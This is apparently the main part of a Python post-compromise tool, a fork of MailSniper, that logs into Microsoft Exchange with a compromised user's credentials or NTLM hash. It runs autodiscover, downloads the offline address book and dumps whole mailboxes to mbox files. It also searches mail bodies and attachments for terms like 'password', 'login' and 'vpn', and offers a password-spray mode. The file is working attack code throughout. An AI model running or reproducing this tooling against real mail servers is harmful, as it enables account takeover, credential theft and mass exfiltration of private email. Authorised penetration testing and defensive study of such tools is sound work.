    if re.match(r'^[a-fA-F\d]{32}:[a-fA-F\d]{32}$', password):
        del auths['Basic']

    autodiscover_urls = []
    fqdn_parts = server.split('.')
    autodiscover_urls += ['autodiscover.' + server[server.index(fqdn_parts[i]):] for i in range(len(fqdn_parts) - 1)]
    autodiscover_urls += [server[server.index(fqdn_parts[i]):] for i in range(len(fqdn_parts) - 1)]
    autodiscover_urls += ['outlook.office365.com']  # на всякий случай если кто-то не додумался влепить autodiscover
    autodiscover_request_body = f"""
                <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
                <Request>
                  <EMailAddress>{email}</EMailAddress>
                  <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
                </Request>
                </Autodiscover>
                """

    print(Fore.LIGHTYELLOW_EX + "\n[!] Will check this domains:")
    for index, url in enumerate(autodiscover_urls):
        print("{:>5s}.\t{}".format(str(index), url))
    else:
        print()

    checked_urls = []
    for url in autodiscover_urls:
        # Check if dns name is present
        try:  # If exception - it doesnt exist
            socket.gethostbyname(url)
            checked_urls.append(url)  # if 'A' record exists, saving
            print(Fore.LIGHTYELLOW_EX + f"[+] Found A record for: {url}")
        except:
            continue

    print()

    autodiscover_urls = checked_urls

    # first we trying https for and ntlm for secure
    for method in ["https://", "http://"]:

        for url in autodiscover_urls:
            for auth_key, auth_type in auths.items():
                headers = {'User-Agent': params['user_agent'],
                           'Content-Type': 'text/xml'}

                try:
                    full_autodiscover_url = f'{method}{url}/autodiscover/autodiscover.xml'

                    session = requests.Session()
                    session.auth = auth_type(email, password)
                    session.verify = False
                    session.trust_env = True

                    redirect_check = session.get(full_autodiscover_url, allow_redirects=False, timeout=1,
                                                 headers=headers)

                    if redirect_check.status_code == 404:
                        continue

                    if redirect_check.status_code == 302:
                        print(Fore.LIGHTYELLOW_EX,
                              f"\n[!] Redirected from {full_autodiscover_url}\n to {redirect_check.next.url} ( {auth_key} auth )\n")
                        full_autodiscover_url = redirect_check.next.url
                        del redirect_check

                    response = session.post(full_autodiscover_url, data=autodiscover_request_body, headers=headers,
                                            timeout=1)

                    if response.status_code == 401:
                        print(Fore.LIGHTRED_EX,
                              f"[-] 401 - Failed to authorise at {full_autodiscover_url} ( {auth_key} auth )\n    (check manually why if creds are correct)")
                        continue

                    if response.status_code != 200 or len(response.text) == 0:
                        continue
                    print(Fore.LIGHTCYAN_EX,
                          f"\n[+] Got VALID autodiscover answer from {full_autodiscover_url} ( {auth_key} auth )")
                    file = f"{params['user_folder']}/autodiscover.xml"
                    with open(file, 'w', encoding='utf8') as writer:
                        writer.write(response.text)

                    regex = '(?<=(<ewsurl>))http(s)?://([^/]+)(?=(\S+</EwsUrl>))'
                    servers = list(set([result[2] for result in re.findall(regex, response.text, flags=re.IGNORECASE)]))
                    print(Fore.LIGHTCYAN_EX, '\n[!] Your servers are:')
                    for index, ews_server in enumerate(servers):
                        print(Fore.LIGHTGREEN_EX, "{:>5s}.\t{}".format(str(index), ews_server))
                    print()

                    return response.text
                except Exception as e:
                    print(Fore.LIGHTRED_EX, f"[-] Could not get {full_autodiscover_url} ( {auth_key} auth )")
                    # print(e)


def get_args():
    parser = argparse.ArgumentParser(description='Python implementation of mailsniper',
                                     usage='python3 pymailsniper.py -s mail.server.com -e email@email.com action object [action options]')

    parser.add_argument('-s', '--server', action="store",
                        dest="server", help='Server which contains EWS (Example - outlook.com)')
    parser.add_argument('-e', '--email', action="store",
                        dest="email", help='Email address of compromised user')
    parser.add_argument('-p', '--password', action="store",
                        dest="password", help='Password, leave empty for prompt')
    parser.add_argument('--proxy', action="store", help="Example: socks5://127.0.0.1:9150")
    parser.add_argument('-ua', '--user-agent', action="store", help="User agent",
                        default='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0')
    parser.add_argument('-nt', '--ntlm', action='store_true', default=False,
                        help='Use NTLM authentication, use for password spray')
    # subparsers init
    subparsers = parser.add_subparsers(title='action', dest='action')
    # subparsers init
    list_subparser = subparsers.add_parser('list', help='perform list of objects', add_help=True)
    search_subparser = subparsers.add_parser('search', help='perform search of objects', add_help=True)
    dump_subparser = subparsers.add_parser('dump', help='perform downloading of objects', add_help=True)
    get_subparser = subparsers.add_parser('get', help='perform downloading of objects', add_help=True)

    get_subparser.add_argument('object', choices=['autodiscover', 'lzx'], type=str)

    # list action subparser args
    list_subparser.add_argument('-a', '--absolute', action='store_true', default=False,
                                help='Folders - Print absolute paths')
    list_subparser.add_argument('-pc', '--print-count', action='store_true', default=False,
                                help='Folders - Print count of child folders and email')
    list_subparser.add_argument('-r', '--root', action='store_true', default=False,
                                help='Folders - Use "root" folder as root for printing insted of "Top Information Store"')
    list_subparser.add_argument('-g', '--gal', action='store_true', default=False,
                                help='Contacts - Use GAL instead of "AllAccount" folder')
    list_subparser.add_argument('-v', '--verbose', action='store_true', default=False,
                                help='Contacts - Print additional info about contacts')
    list_subparser.add_argument('-oab', '--oab', action='store', default=None,
                                help='OAB file location (Not .lzx!!!)')
    list_subparser.add_argument('object', choices=['folders', 'emails', 'contacts', 'oab'], type=str)

    # dump action subparser args
    dump_subparser.add_argument('-d', '--dump', action='store',
                                default=datetime.datetime.today().strftime('Dump %Y-%m-%d %H-%M'),
                                help='Local folder to store .mbox dumps, default - "DUMP" + current datetime')
    dump_subparser.add_argument('-c', '--count', action='store', default=None, type=int,
                                help='Count of N last emails in folder to dump')
    dump_subparser.add_argument('-t', '--threads', action='store', default="1", type=int,
                                help='Threads count for dumping (experimental - NOT SUCH EFFECTIVE)')
    dump_subparser.add_argument('-f', '--folder', action='store', default="Inbox",
                                help='Folder name (on server) to dump, ("all", "Inbox", "Sent" also avaliable)')
    dump_subparser.add_argument('object', choices=['folders', 'emails', 'contacts'], type=str)
    dump_subparser.add_argument('-r', '--recurse', action='store_true', default=False,
                                help='Do recurse dump for custom folder (-f)')
    #
    # search action subparser args
    search_subparser.add_argument('-f', '--folder', action="store", dest="folder", metavar=' ',
                                  help='Folder to search through', default='Inbox')
    search_subparser.add_argument('-t', '--terms', action="store",
                                  dest="terms", metavar=' ',
                                  help='Terms to search in email text body (Comma separated)',
                                  type=str, default='password,login,vpn')
    search_subparser.add_argument('-c', '--count', action="store",
                                  dest="count", metavar=' ', help='Search up to N emails for term', type=int)
    search_subparser.add_argument('--field', action="store", default='body',
                                  dest="field", help='Email field to search. Default is subject',
                                  choices=['subject', 'body'])
    search_subparser.add_argument('object', choices=['folders', 'emails', 'attach'], type=str)
    search_subparser.add_argument('--dump', action='store_true', default=False,
                                  help='Dump found to mbox file')
    search_subparser.add_argument('-r', '--recurse', action='store_true', default=False,
                                  help='Do recurse search if custom folder (-f) specified')
    search_subparser.add_argument('-q', '--quite', action='store_true', default=False,
                                  help='Do not print search results on the screen')
    search_subparser.add_argument('-n', '--name', action="store",
                                  dest="name", metavar=' ',
                                  help='Search this terms in attachment names (Comma separated)\nExample - docx,config,report',
                                  type=str)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    args = vars(parser.parse_args())
    if not args['action']:
        parser.print_help()
        sys.exit()
    return args


# Function for finding and downloading compressed OAB (.lzx)
def get_lzx_file(params=None):
    # server = params.get('server').replace("https://", "").replace("http://", "")
    email = params['email']
    password = params['password']
    autodiscover_file = f'{params["user_folder"]}/autodiscover.xml'

    headers = {'User-Agent': params['user_agent']}

    if isfile(autodiscover_file):
        with open(autodiscover_file, 'r', encoding='utf8') as reader:
            autodiscover = reader.read()
    else:
        autodiscover = get_Autodiscover(params=params)
        if not autodiscover:
            print(Fore.LIGHTRED_EX, '\n[-] Didn\'t found autodiscover, exiting')
            return

    auths = {'NTLM': HttpNtlmAuth, 'Basic': HTTPBasicAuth}
    if re.match(r'^[a-fA-F\d]{32}:[a-fA-F\d]{32}$', password):
        del auths['Basic']

    regex = r'<OABUrl>(http.*)</OABUrl>'
    oab_urls = re.findall(regex, autodiscover, flags=re.IGNORECASE)

    oab_urls = list(set(oab_urls))
    print()
    for oab_url in oab_urls:
        print(Fore.LIGHTYELLOW_EX + f"[+] Found oab url: {oab_url}oab.xml")
    print()
    # first, checking NTLM auth, then Basic
    for auth_key, auth_type in auths.items():
        # Creating session
        session = requests.Session()
        session.auth = auth_type(email, password)

        session.verify = False
        session.trust_env = True
        # going throughout oab urls from autodiscover
        for oab_url in oab_urls:
            try:
                # opening lzx url and looking for file to download
                response = session.get(oab_url + 'oab.xml', headers=headers)
                found = re.search(r'>(.+lzx)<', response.text)

                if found:
                    lzx_filename = found.group(1)

                    print(Fore.LIGHTYELLOW_EX + f"[+] Found lzx url: {oab_url + lzx_filename}")

                    lzx_url = oab_url + lzx_filename

                    # trying to download file
                    lzx_response = session.get(lzx_url, stream=True, verify=False)

                    if lzx_response.status_code == 200:
                        with open(f'{params["user_folder"]}/{lzx_filename}', 'wb') as f:
                            lzx_response.raw.decode_content = True
                            shutil.copyfileobj(lzx_response.raw, f)

                        print(Fore.LIGHTGREEN_EX + f'\n[+] Saved to: "./{params["user_folder"]}/{lzx_filename}"')
                        print(Fore.LIGHTYELLOW_EX + '\n[!] You can use oabextract tool to get oab from lzx file')
                        # print('\n[!] Place it here for using "list oab"')
                        print(Fore.LIGHTYELLOW_EX +
                              '    Download it from https://github.com/bsrinivasguptha/LzxToOabComplied/blob/master/Release.zip')
                        print(Fore.LIGHTYELLOW_EX +
                              '    Then you can use "pymailsniper -e user@example.com list oab --oab ./path/to/oab.oab"\n')
                        return
                    else:
                        print(f"[!] Could not get: {lzx_url} ( {auth_key} Auth )\n")
            except Exception as e:
                print(f"[!] Could not get: {oab_url} ( {auth_key} Auth )\n")

    print(f"[!] Could not anything, try without server\n")
    return


def list_oab(params=None):
    autodiscover_file = f'{params["user_folder"]}/autodiscover.xml'
    if isfile(autodiscover_file):
        with open(autodiscover_file, 'r', encoding='utf8') as reader:
            autodiscover = reader.read()
    else:
        autodiscover = get_Autodiscover(params=params)

    """Searching delimiter in autodiscover"""

    splitter_regex = '(<LegacyDN>)(.*/cn=Recipients)'
    try:
        delimiter = re.search(splitter_regex, autodiscover)
        delimiter = delimiter.group(2).encode('utf8')
    except Exception as e:
        print("[!] Exception - Could not find LegacyDN in autodiscover\n")
        print(e)

    oab_file = params['oab']

    # read in file
    with open(oab_file, "rb") as reader:
        content = reader.read()

    # this parser code is pretty shitty BUT
    # when i was looking for any solutions
    # i did not found anything better than just using 'strings' tool
    # i stared at microsoft documentation, compared byte by byte of mine oabs and docs examples
    # in hex editor to write normal parser BUT
    # I COULDN'T soooo....
    # ANY CORRECTIONS ARE WELCOME

    # first part is garbage (exif, magic bytes and so on)
    user_list = content.split(delimiter)[1:]

    # in oab we have text fields which contains string with NULL byte at the end
    # so we trying to split fields (i am not sure is it utf8 everytime)
    user_list = [user.split(b'\x00') for user in user_list]

    for user_index in range(len(user_list)):
        # first we converting every printable bytes printable to strings
        user_list[user_index] = [field.decode('utf8', errors='replace') for field in user_list[user_index]]
        # then cutting out small fields shorter than 3 chars
        user_list[user_index] = [field for field in user_list[user_index] if field != "" and 3 < len(field)]

    file = f"{params['user_folder']}/parsed_oab.txt"
    writer = open(file, 'w', encoding='utf8')
    for user in range(len(user_list)):
        for field in range(len(user_list[user])):
            writer.write(str(field) + '\t')
            writer.write(user_list[user][field])
            writer.write('\n')
        writer.write('\n')

    print(f"[!] OAB parsed to {file}\n")
    print("\n[!] Please do commits for this parser to get less UGLY results")

    return


if __name__ == "__main__":
    # This is where we start parsing arguments
    banner = "# PyMailSniper [http://www.foofus.net] (C) sph1nx Foofus Networks <sph1nx@foofus.net>"
    banner += "\n# Fork By HydroSausager\n"

    print_logo()
    print(banner)

    # TODO: CLEAR THIS SHIT AND ADD DEBUG MODE
    # attach_parser = subparsers.add_parser(
    #     'attachment', help="List/Download Attachments", parents=[optional_parser])
    # attach_parser.add_argument('-d', '--directory', action="store",
    #                            dest="directory", help='Directory to download attachments', metavar=' ')
    # attach_parser.add_argument('-t', '--terms', action="store",
    #                            dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)',
    #                            nargs='+', type=str, default='RSA,token,VPN')
    # attach_parser.add_argument('-f', '--folder', action="store",
    #                            dest="folder", metavar=' ', help='Folder to search through', default='Inbox')
    # attach_parser.add_argument('-c', '--count', action="store",
    #                            dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
    # attach_parser.add_argument('--field', action="store",
    #                            dest="field", help='Email field to search. Default is subject',
    #                            choices=['subject', 'body'])
    #
    # delegate_parser = subparsers.add_parser(
    #     'delegation', help="Find where compromised user has access", parents=[optional_parser])
    # delegate_parser.add_argument('-g', '--gal', action="store",
    #                              dest="galList", metavar=' ', help='List of email addresses to check access',
    #                              required=True)
    #
    # email_parser = subparsers.add_parser('emails', help="Search for Emails", parents=[optional_parser])

    args = get_args()

    BaseProtocol.USERAGENT = args['user_agent']

    # proxy stuff
    if args['proxy']:
        if not proxy_check(params=args):
            print(Fore.LIGHTRED_EX, "\n[!] Proxy is down, exiting\n")
            sys.exit()
        else:
            print(Fore.LIGHTGREEN_EX, f'\nProxy {args["proxy"]} looks okay, setting env variables and adapter\n')
            proxy = args['proxy']
            if proxy:
                try:
                    del os.environ['HTTP_PROXY']
                    del os.environ['HTTPS_PROXY']
                except:
                    pass
                os.environ['HTTP_PROXY'] = proxy
                os.environ['HTTPS_PROXY'] = proxy
                BaseProtocol.HTTP_ADAPTER_CLS = MyProxyAdapter
    else:
        BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter

    action = args['action']
    action_object = args['object']

    args['user_folder'] = create_user_folder(params=args)

    print(f"[+] Email - {args['email']}, server - {args['server']}")

    if action == 'list' and args['object'] == 'oab':
        if not args['email']:
            print('\n[!] Please, specify -e --email\n')
        if args['oab']:
            list_oab(params=args)
        else:
            print("\n[!] Please specify -oab argument\n")

        sys.exit()

    # secure input if password is missing
    if not args['password']:
        args['password'] = getpass.getpass(prompt='Password: ', stream=None)

    # TODO: understand that
    # if parsed_arguments.get("galList"):
    #     fileparser = file_parser(parsed_arguments)

    # if parsed_arguments.get("output"):
    #     loghandle = loggerCreate(parsed_arguments)

    # here are option which do not require connection via exchangelib
    if action == 'get':
        if args['object'] == 'autodiscover':
            # TODO: ask if .xml file exist already
            answer = get_Autodiscover(params=args)
            if answer:
                print(Fore.LIGHTGREEN_EX, f"\n[=] Saved to \"./{args['user_folder']}/autodiscover.xml\"\n")
            else:
                print(Fore.LIGHTRED_EX, f"\n[!] Nothing found\n")
                if args['server']:
                    print(Fore.LIGHTRED_EX, '\n[!] Try again without -s !\n')
            sys.exit()
        elif args['object'] == 'lzx':
            get_lzx_file(params=args)
            sys.exit()

    if not args['server']:
        print(Fore.LIGHTRED_EX, '\n[!] Please specify server! Exiting.\n')
        sys.exit()

    accountObj = account_Setup(args)

    start_time = time.time()

    if action == 'list':
        if action_object == 'emails':
            print('NOT IMPLEMENTED YET!')
        if action_object == 'contacts':
            list_contacts(accountObject=accountObj, params=args)
        if action_object == 'folders':
            list_folders(accountObject=accountObj, params=args)
    elif action == 'dump':
        # TODO: implement "dump all"
        if action_object == 'emails':
            # alias for "dump folder"
            dump_Folders(accountObj, params=args)
        if action_object == 'contacts':
            print('NOT IMPLEMENTED YET!')
        if action_object == 'folders':
            dump_Folders(accountObj, params=args)

    elif action == 'search':
        if action_object == 'emails':
            search_Emails(accountObj, args)
        elif action_object == 'attach':
            search_Attachments(accountObject=accountObj, params=args)
        elif action_object == 'contacts':
            print('NOT IMPLEMENTED YET!')
        elif action_object == 'folders':
            print('NOT IMPLEMENTED YET!')

    # TODO: Разобраться с этим
    # elif parsed_arguments['modules'] == 'attachment':
    #     searchAttachments(accountObj, parsed_arguments)
    # elif parsed_arguments['modules'] == 'delegation':
    #     searchDelegates(parsed_arguments, fileparser)
    if args['proxy']:
        try:
            del os.environ['HTTP_PROXY']
            del os.environ['HTTPS_PROXY']
        except:
            pass
    print(Fore.LIGHTYELLOW_EX + "[=] Took time: {:.3f} min\n\n".format((time.time() - start_time) / 60))
